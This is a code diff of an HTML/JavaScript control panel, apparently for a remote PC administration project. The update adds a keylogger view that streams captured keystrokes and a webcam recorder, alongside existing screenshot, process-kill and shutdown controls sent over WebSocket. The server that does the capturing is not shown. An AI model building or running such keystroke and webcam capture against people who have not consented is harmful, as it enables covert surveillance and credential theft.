@@ -2,270 +2,392 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Remote PC Control - Process Manager</title>
+    <title>Remote PC Control - Final</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f9; }
-        .container { max-width: 1200px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-        .controls { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
-        button { padding: 8px 12px; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; transition: background-color 0.2s; }
-        button:disabled { background-color: #ccc; cursor: not-allowed; }
-        .log-box { background-color: #333; color: #0f0; padding: 10px; border-radius: 4px; max-height: 150px; overflow-y: scroll; font-family: 'Courier New', monospace; margin-top: 10px; font-size: 0.8em; }
-        #process-table { width: 100%; border-collapse: collapse; margin-top: 15px; }
-        #process-table th, #process-table td { border: 1px solid #ddd; padding: 8px; text-align: left; font-size: 0.9em; }
-        #process-table th { background-color: #f2f2f2; cursor: pointer; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background-color: #f0f2f5; color: #333; }
+        .container { max-width: 1200px; margin: 20px auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        
+        h1 { text-align: center; color: #2c3e50; margin-bottom: 20px; }
+        h2 { border-bottom: 2px solid #007bff; padding-bottom: 5px; color: #007bff; margin-top: 30px; }
+        
+        .section { margin-bottom: 20px; padding: 15px; background: #f8f9fa; border-radius: 8px; border: 1px solid #e9ecef; }
+        
+        .controls { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
+        
+        input[type="text"], input[type="number"] { padding: 8px; border: 1px solid #ced4da; border-radius: 4px; flex-grow: 1; max-width: 300px; }
+        
+        button { padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer; font-weight: 600; transition: all 0.2s; color: white; background-color: #6c757d; }
+        button:hover { opacity: 0.9; transform: translateY(-1px); }
+        button:active { transform: translateY(0); }
+        
+        .btn-primary { background-color: #007bff; }
+        .btn-danger { background-color: #dc3545; }
+        .btn-warning { background-color: #ffc107; color: #212529; }
+        .btn-success { background-color: #28a745; }
+        .btn-info { background-color: #17a2b8; }
+        .btn-dark { background-color: #343a40; }
 
-        /* 🔹 NEW: khu vực hiển thị screenshot */
-        #screen-wrapper {
-            margin-top: 20px;
-        }
-        #screen-image {
-            max-width: 100%;
-            border: 1px solid #ddd;
+        /* Log console */
+        .log-box { background-color: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 6px; height: 150px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 0.85em; margin-top: 20px; border: 1px solid #444; }
+        
+        /* Keylogger Output Area */
+        #keylog-area {
+            width: 100%;
+            height: 150px;
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 10px;
+            border: 1px solid #333;
             border-radius: 4px;
             margin-top: 10px;
+            box-sizing: border-box; /* Để padding không làm vỡ layout */
+            resize: vertical;
         }
+
+        /* Table styles */
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; background: white; }
+        th, td { border: 1px solid #dee2e6; padding: 10px; text-align: left; font-size: 0.9em; }
+        th { background-color: #e9ecef; color: #495057; }
+        tr:hover { background-color: #f1f1f1; }
+
+        /* Screenshot area */
+        #screen-wrapper { text-align: center; margin-top: 10px; }
+        #screen-image { max-width: 100%; border: 2px solid #333; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <h1>⚙️ Remote Control - Process Manager</h1>
-        <div class="controls">
-            <button onclick="shutdownSystem()" style="background-color: #ff5733;">Shutdown System</button>
-            <button onclick="restartSystem()" style="background-color: #ffc300;">Restart System</button>
-        </div>
-        
-        <div class="controls">
-            <button id="btn-connect" onclick="connectWS()">Connect/Reconnect (9001)</button>
-            <button onclick="sendCommand('PROCESS', 'LIST')">1. List Processes</button>
-            
-            <input type="text" id="proc-path" placeholder="Path/Name (e.g., notepad.exe)" value="notepad.exe" style="flex-grow: 1; padding: 8px;">
-            <button onclick="startProcess()">2. Start Process</button>
+        <h1>📡 Remote Control Panel</h1>
 
-            <input type="number" id="kill-pid" placeholder="PID to Kill" style="width: 100px; padding: 8px;">
-            <button onclick="killProcess()" style="background-color: #dc3545;">3. Kill PID</button>
-
-            <!-- 🔹 NEW: nút chụp màn hình -->
-            <button onclick="captureScreen()" style="background-color: #28a745;">4. Capture Screen</button>
-            <button onclick="listApplications()">List Applications</button>
-            <button onclick="startApplication('Calculator')">Start Calculator</button>
-            <button onclick="killApplication('Calculator')">Kill Calculator</button>
-
-            
-        
+        <div class="section">
+            <div class="controls">
+                <button id="btn-connect" class="btn-info" onclick="connectWS()">🔌 Connect (9010)</button>
+                <div style="flex-grow: 1;"></div>
+                <button class="btn-warning" onclick="restartSystem()">🔄 Restart PC</button>
+                <button class="btn-danger" onclick="shutdownSystem()">🛑 Shutdown PC</button>
+            </div>
         </div>
 
-        <h3>Console Log</h3>
+        <div class="section" style="border-left: 5px solid #dc3545;">
+            <h2>⌨️ Keylogger Monitor</h2>
+            <div class="controls">
+                <button class="btn-danger" onclick="startKeylogger()">▶ Start Hook</button>
+                <button class="btn-dark" onclick="stopKeylogger()">⏹ Stop Hook</button>
+                <button class="btn-warning" onclick="clearKeylog()">🧹 Clear Log</button>
+            </div>
+            <textarea id="keylog-area" readonly placeholder="Keystrokes will appear here..."></textarea>
+        </div>
+
+        <div class="section">
+            <h2>📦 Application Manager</h2>
+            <div class="controls">
+                <button class="btn-primary" onclick="listApps()">📂 List Apps</button>
+                <input type="text" id="app-keyword" placeholder="App name (e.g., chrome, code)">
+                <button class="btn-danger" onclick="killAppUI()">☠️ Kill App</button>
+                <input type="text" id="app-start-path" placeholder="Path to start (e.g., notepad)">
+                <button class="btn-success" onclick="startAppUI()">🚀 Start App</button>
+            </div>
+            <table id="app-table">
+                <thead><tr><th>Executable</th><th>Count</th><th>Action</th></tr></thead>
+                <tbody id="app-table-body"><tr><td colspan="3" style="text-align:center">No data</td></tr></tbody>
+            </table>
+        </div>
+
+        <div class="section">
+            <h2>⚙️ Process Manager</h2>
+            <div class="controls">
+                <button class="btn-primary" onclick="listProcesses()">📂 List Processes</button>
+                <input type="number" id="kill-pid" placeholder="PID to Kill" style="max-width: 150px;">
+                <button class="btn-danger" onclick="killProcessUI()">☠️ Kill PID</button>
+            </div>
+            <div style="max-height: 200px; overflow-y: auto; margin-top: 10px; border: 1px solid #ddd;">
+                <table id="process-table">
+                    <thead><tr><th>PID</th><th>Name</th><th>Threads</th><th>Action</th></tr></thead>
+                    <tbody id="process-table-body"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>📸 Screen Capture</h2>
+            <div class="controls">
+                <button class="btn-success" onclick="captureScreen()">📷 Take Screenshot</button>
+            </div>
+            <div id="screen-wrapper">
+                <img id="screen-image" alt="Screenshot will appear here...">
+            </div>
+        </div>
+        <h2>📹 Webcam Recorder</h2>
+            <div class="controls">
+                <label>Duration (sec): </label>
+                <input type="number" id="cam-duration" value="5" min="1" max="10" style="max-width: 60px;">
+                <button class="btn-danger" onclick="recordWebcamUI()">🔴 Record Video</button>
+            </div>
+            
+            <div style="text-align: center; margin-top: 15px;">
+                <p id="cam-status" style="display: none; color: #e67e22; font-weight: bold; animation: blink 1s infinite;">
+                    🎥 Recording in progress... Please wait...
+                </p>
+                
+                <video id="webcam-video" controls style="max-width: 100%; border: 2px solid #333; border-radius: 4px; display: none; box-shadow: 0 4px 12px rgba(0,0,0,0.3);">
+                    Your browser does not support the video tag.
+                </video>
+            </div>
+        <h3>🖥️ System Log</h3>
         <div class="log-box" id="output"></div>
-
-        <!-- 🔹 NEW: khu vực hiển thị screenshot -->
-        <div id="screen-wrapper">
-            <h3>Screen Capture</h3>
-            <small>(Ảnh mới nhất chụp từ máy remote)</small><br>
-            <img id="screen-image" alt="No screenshot yet">
-        </div>
-
-        <h3>Process List (Click on PID to Kill)</h3>
-        <table id="process-table">
-            <thead>
-                <tr><th>PID</th><th>Name</th><th>Threads</th><th>command</th></tr>
-            </thead>
-            <tbody id="process-table-body">
-            </tbody>
-        </table>
     </div>
 
     <script>
         let ws = null;
-        // const WS_URL = 'ws://127.0.0.1:9001'; 
-        const WS_URL = 'ws://127.0.0.1:9010';
-        // const WS_URL = "ws://192.168.137.1:9010";
-        //const WS_URL = "ws://10.29.160.111:9010";
-        // const WS_URL = "ws://192.168.88.163:9010";
+        const WS_URL = 'ws://127.0.0.1:9010'; 
 
         const output = document.getElementById('output');
-        const screenImg = document.getElementById('screen-image'); // 🔹 NEW
-        
-        // UTILITY FUNCTIONS
+        const screenImg = document.getElementById('screen-image');
+        const keylogArea = document.getElementById('keylog-area'); // Khu vực hiển thị phím
+
         function logStatus(message, color = 'white') {
-    output.innerHTML += 
-        `<pre style="color:${color}; margin:0; white-space:pre-wrap;">${message}</pre>`;
-    output.scrollTop = output.scrollHeight;
-}
+            const time = new Date().toLocaleTimeString();
+            output.innerHTML += `<div style="color:${color}; margin-bottom: 2px;">[${time}] ${message}</div>`;
+            output.scrollTop = output.scrollHeight;
+        }
 
-
-        // 1. WEBSOCKET CONNECTION
-        function connectWS(){
+        // --- WEBSOCKET ---
+        function connectWS() {
             if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
-                logStatus('Already connected or connecting.', 'yellow');
+                logStatus('⚠ Already connecting or connected.', 'yellow');
                 return;
             }
-            logStatus(`Connecting to ${WS_URL}...`, 'yellow');
+            logStatus(`Connecting to ${WS_URL}...`, 'cyan');
             ws = new WebSocket(WS_URL);
 
-            ws.onopen = () => logStatus('Connected to server.', 'lime');
-            ws.onclose = () => logStatus('Disconnected.', 'red');
-            ws.onerror = (e) => logStatus('WebSocket Error: Failed to connect.', 'red');
-            
+            ws.onopen = () => {
+                logStatus('✅ Connected to Server!', '#00ff00');
+                document.getElementById('btn-connect').innerText = "✅ Connected";
+            };
+            ws.onclose = () => {
+                logStatus('❌ Disconnected.', 'red');
+                document.getElementById('btn-connect').innerText = "🔌 Connect";
+            };
+            ws.onerror = (e) => logStatus('❌ WebSocket Error.', 'red');
+
             ws.onmessage = (event) => {
                 try {
                     const response = JSON.parse(event.data);
                     handleServerResponse(response);
                 } catch (e) {
-                    logStatus('Invalid JSON received.', 'red');
+                    logStatus('❌ Invalid JSON received', 'red');
                 }
             };
         }
 
-        // 2. SEND COMMAND (The new OOP structure)
-        function sendCommand(module, command, params = {}) {
+        function sendCommand(module, command, payload = {}) {
             if (!ws || ws.readyState !== WebSocket.OPEN) {
-                logStatus('WebSocket not connected. Please connect first.', 'red');
+                logStatus('⚠ Not connected!', 'red');
                 return;
             }
-            const payload = JSON.stringify({ module: module, command: command, ...params });
-            logStatus(`SENT: ${payload}`, 'cyan');
-            ws.send(payload);
+            const msg = { module, command, payload };
+            ws.send(JSON.stringify(msg));
+            // logStatus(`📤 SENT [${module} - ${command}]`, '#00bfff');
         }
 
-        // 3. SPECIFIC COMMAND HANDLERS
-        function startProcess() {
-            const path = document.getElementById('proc-path').value;
-            if (path) {
-                sendCommand('PROCESS', 'START', { path: path });
-            } else {
-                logStatus('Process path cannot be empty.', 'red');
+        // --- KEYLOGGER FUNCTIONS ---
+        function startKeylogger() {
+            sendCommand('KEYBOARD', 'START');
+            logStatus("Requesting Keylogger Start...", "orange");
+        }
+        function stopKeylogger() {
+            sendCommand('KEYBOARD', 'STOP');
+            logStatus("Requesting Keylogger Stop...", "orange");
+        }
+        function clearKeylog() {
+            keylogArea.value = "";
+        }
+
+        // --- APP & PROCESS FUNCTIONS ---
+        function listApps() { sendCommand('APP', 'LIST'); }
+        function killAppUI() { 
+            const name = document.getElementById('app-keyword').value; 
+            if(name) sendCommand('APP', 'KILL', { name }); 
+        }
+        function startAppUI() {
+            const path = document.getElementById('app-start-path').value;
+            if(path) sendCommand('APP', 'START', { path });
+        }
+        function listProcesses() { sendCommand('PROCESS', 'LIST'); }
+        function killProcessUI() {
+            const pid = document.getElementById('kill-pid').value;
+            if(pid) sendCommand('PROCESS', 'KILL', { pid: parseInt(pid) });
+        }
+        function killProcessByPID(pid) { sendCommand('PROCESS', 'KILL', { pid: parseInt(pid) }); }
+        function killAppByName(name) { sendCommand('APP', 'KILL', { name: name }); }
+
+        // --- SYSTEM & SCREEN ---
+        function shutdownSystem() { if(confirm('Shutdown PC?')) sendCommand('SYSTEM', 'SHUTDOWN'); }
+        function restartSystem() { if(confirm('Restart PC?')) sendCommand('SYSTEM', 'RESTART'); }
+        function captureScreen() { sendCommand('SCREEN', 'CAPTURE'); }
+
+        // --- WEBCAM FUNCTIONS ---
+        function recordWebcamUI() {
+            const durationInput = document.getElementById('cam-duration');
+            let duration = parseInt(durationInput.value) || 5;
+            
+            // Giới hạn 10 giây để tránh treo server quá lâu
+            if (duration > 10) duration = 10;
+            if (duration < 1) duration = 1;
+            durationInput.value = duration;
+
+            // Gửi lệnh
+            sendCommand('WEBCAM', 'RECORD', { duration: duration });
+
+            // Cập nhật UI
+            document.getElementById('cam-status').style.display = 'block'; // Hiện chữ đang quay
+            document.getElementById('webcam-video').style.display = 'none'; // Ẩn video cũ
+            logStatus(`🎥 Requesting ${duration}s webcam recording... (Server will be busy)`, 'orange');
+        }
+
+        // --- RESPONSE HANDLER ---
+        function handleServerResponse(res) {
+            if (res.status === 'error') {
+                logStatus(`⛔ ERROR: ${res.message}`, 'red');
+                return;
             }
-        }
 
-        function killProcess(pid = null) {
-            const finalPid = pid || document.getElementById('kill-pid').value;
-            if (finalPid) {
-                sendCommand('PROCESS', 'KILL', { pid: parseInt(finalPid) });
-            } else {
-                logStatus('PID to kill cannot be empty.', 'red');
+            // 1. Xử lý KEYLOGGER
+            if (res.module === 'KEYBOARD' && res.command === 'PRESS') {
+                const key = res.data.key;
+                
+                // Xử lý hiển thị cho đẹp
+                if (key === '[ENTER]\n' || key === '[ENTER]') {
+                    keylogArea.value += '\n';
+                } else if (key === '[BACKSPACE]') {
+                    keylogArea.value = keylogArea.value.slice(0, -1);
+                } else if (key === '[TAB]') {
+                    keylogArea.value += '\t';
+                } else {
+                    keylogArea.value += key;
+                }
+                
+                keylogArea.scrollTop = keylogArea.scrollHeight; // Tự cuộn xuống dưới
+                return; // Không log vào console chính để tránh rác
             }
-        }
 
-        // Ham xu ly shutdown
-        function shutdownSystem() {
-            sendCommand('SYSTEM', 'SHUTDOWN');
-        }
-
-        // Ham xu ly restart
-        function restartSystem() {
-            sendCommand('SYSTEM', 'RESTART');
-        }
-
-        // 🔹 NEW: gửi lệnh chụp màn hình
-        function captureScreen() {
-            sendCommand('SCREEN', 'CAPTURE');
-        }
-
-        // 🔹 NEW: hiển thị ảnh screen từ base64
-        function showScreenFromBase64(base64, format) {
-            // Backend bạn hiện đang trả BMP_BASE64, nên dùng image/bmp
-            // Nếu sau này đổi sang PNG thì chỉnh mime = 'image/png'
-            const mime = (format === 'PNG_BASE64' || format === 'PNG') ? 'image/png' : 'image/bmp';
-            screenImg.src = `data:${mime};base64,${base64}`;
-        }
-
-        // list app
-        function listApplications() {
-            sendCommand('APP', 'LIST_APPS');
-        }
-
-        // start app
-        function startApplication(appName) {
-            sendCommand('APP', 'START_APP', { app_name: appName });
-        }
-
-        // kill app
-        function killApplication(appName) {
-            sendCommand('APP', 'KILL_APP', { app_name: appName });
-        }
-
-
-        // 4. RESPONSE HANDLER
-        function handleServerResponse(response) {
-    // luôn log toàn bộ JSON trước
-    logJSON(response, 'cyan');
-
-    // --- SUCCESS ---
-    if (response.status === 'success') {
-
-        // PROCESS/LIST
-        if (response.module === 'PROCESS' && response.command === 'LIST') {
-            const list = response.data.process_list || response.data;
-            displayProcesses(list);
-            logStatus(`Process count = ${list.length}`, 'yellow');
-        }
-
-        // APP/LIST_APPS (sau này dùng)
-        if (response.module === 'APP' && response.command === 'LIST_APPS') {
-            logStatus(`Received ${response.apps.length} applications`, 'orange');
-        }
-
-        // SCREEN/CAPTURE
-        if (response.module === 'SCREEN' && response.command === 'CAPTURE') {
-            if (response.image_base64) {
-                showScreenFromBase64(response.image_base64, response.format);
-                logStatus("Screenshot updated.", "#00ffcc");
+            // 2. Xử lý APP
+            if (res.module === 'APP') {
+                if (res.command === 'LIST') {
+                    displayApps(res.apps);
+                    logStatus(`✅ Listed ${res.apps.length} applications.`, '#00ff00');
+                } else if (res.command === 'KILL') {
+                    logStatus(`☠️ Killed ${res.data.killed_count} processes ("${res.data.keyword}")`, 'orange');
+                    setTimeout(listApps, 500);
+                } else if (res.command === 'START') {
+                    logStatus(`🚀 Started PID: ${res.pid}`, '#00ff00');
+                }
             }
+
+            // 3. Xử lý PROCESS
+            else if (res.module === 'PROCESS') {
+                if (res.command === 'LIST') {
+                    const list = res.data.process_list || res.data;
+                    displayProcesses(list);
+                    logStatus(`✅ Listed ${list.length} processes.`, '#00ff00');
+                } else if (res.command === 'KILL') {
+                    logStatus(`☠️ PID ${res.pid} killed.`, 'orange');
+                    listProcesses();
+                }
+            }
+
+            // 4. Xử lý SCREEN
+            else if (res.module === 'SCREEN' && res.command === 'CAPTURE') {
+                if (res.image_base64) {
+                    const mime = (res.format === 'PNG') ? 'image/png' : 'image/bmp';
+                    screenImg.src = `data:${mime};base64,${res.image_base64}`;
+                    logStatus("📸 Screenshot received.", "#00ffcc");
+                }
+            }
+
+            // 5. Xử lý STATUS (Start/Stop Keylogger phản hồi)
+            else if (res.module === 'KEYBOARD' && (res.command === 'START' || res.command === 'STOP')) {
+                logStatus(`ℹ️ ${res.message}`, 'cyan');
+            }
+
+            // 6. Xử lý WEBCAM (MỚI)
+            else if (res.module === 'WEBCAM' && res.command === 'RECORD_RESULT') {
+                // Ẩn thông báo "Đang quay"
+                document.getElementById('cam-status').style.display = 'none';
+
+                if (res.status === 'success' && res.data) {
+                    try {
+                        // --- GIẢI MÃ BASE64 SANG BINARY ---
+                        const binaryString = window.atob(res.data);
+                        const len = binaryString.length;
+                        const bytes = new Uint8Array(len);
+                        for (let i = 0; i < len; i++) {
+                            bytes[i] = binaryString.charCodeAt(i);
+                        }
+
+                        // --- TẠO BLOB URL ---
+                        // Server trả về H.264 trong MP4 container
+                        const blob = new Blob([bytes], { type: 'video/mp4' });
+                        const videoUrl = URL.createObjectURL(blob);
+
+                        // --- HIỂN THỊ VIDEO ---
+                        const videoPlayer = document.getElementById('webcam-video');
+                        videoPlayer.src = videoUrl;
+                        videoPlayer.style.display = 'block';
+                        videoPlayer.play(); // Tự động phát
+
+                        logStatus(`✅ Received video (${(len / 1024 / 1024).toFixed(2)} MB).`, '#00ff00');
+                    } catch (e) {
+                        logStatus('❌ Error processing video data: ' + e.message, 'red');
+                    }
+                } else {
+                    logStatus(`❌ Webcam Failed: ${res.message}`, 'red');
+                }
+            }
+            
         }
 
-        // SYSTEM ACTIONS (shutdown + restart)
-        if (response.module === 'SYSTEM') {
-            if (response.command === 'SHUTDOWN') {
-                logStatus("⚠ System is shutting down!", "red");
+        // --- UI RENDERING ---
+        function displayApps(apps) {
+            const tbody = document.getElementById('app-table-body');
+            tbody.innerHTML = '';
+            if (!apps || apps.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="3" style="text-align:center">No apps found</td></tr>'; return;
             }
-            if (response.command === 'RESTART') {
-                logStatus("⚠ System is restarting!", "yellow");
-            }
+            apps.sort((a, b) => a.exe.localeCompare(b.exe));
+            apps.forEach(app => {
+                const row = tbody.insertRow();
+                row.insertCell().innerHTML = `<b>${app.exe}</b>`;
+                row.insertCell().textContent = app.count;
+                const btn = document.createElement('button');
+                btn.textContent = "Kill All";
+                btn.className = "btn-danger";
+                btn.style.padding = "2px 8px";
+                btn.onclick = () => killAppByName(app.exe);
+                row.insertCell().appendChild(btn);
+            });
         }
-        return;
-    }
 
-    // --- ERROR ---
-    if (response.status === 'error') {
-        logStatus(`[ERROR] ${response.message}`, 'red');
-        return;
-    }
-
-    // --- UNKNOWN ---
-    logJSON(response, 'yellow');
-}
-
-function logJSON(obj, color = 'white') {
-    const pretty = JSON.stringify(obj, null, 2);
-    logStatus(pretty, color);
-}
-
-        // 5. UI DISPLAY
-        function displayProcesses(processes) {
+        function displayProcesses(procs) {
             const tbody = document.getElementById('process-table-body');
             tbody.innerHTML = '';
-            
-            // Sắp xếp theo tên
-            processes.sort((a, b) => a.name.localeCompare(b.name));
-
-            processes.forEach(p => {
+            procs.slice(0, 300).forEach(p => { // Limit 300
                 const row = tbody.insertRow();
                 row.insertCell().textContent = p.pid;
                 row.insertCell().textContent = p.name;
-                row.insertCell().textContent = p.threads || 'N/A';
-                
-                const commandCell = row.insertCell();
-                const killBtn = document.createElement('button');
-                killBtn.textContent = 'Kill';
-                killBtn.style.backgroundColor = '#dc3545';
-                killBtn.onclick = () => killProcess(p.pid);
-                commandCell.appendChild(killBtn);
+                row.insertCell().textContent = p.threads || '-';
+                const btn = document.createElement('button');
+                btn.textContent = "X";
+                btn.className = "btn-danger";
+                btn.style.padding = "2px 6px";
+                btn.onclick = () => killProcessByPID(p.pid);
+                row.insertCell().appendChild(btn);
             });
-            logStatus(`Displayed ${processes.length} processes.`, 'yellow');
         }
 
-        // Khởi tạo kết nối
-        connectWS(); 
+        connectWS();
     </script>
 </body>
 </html>
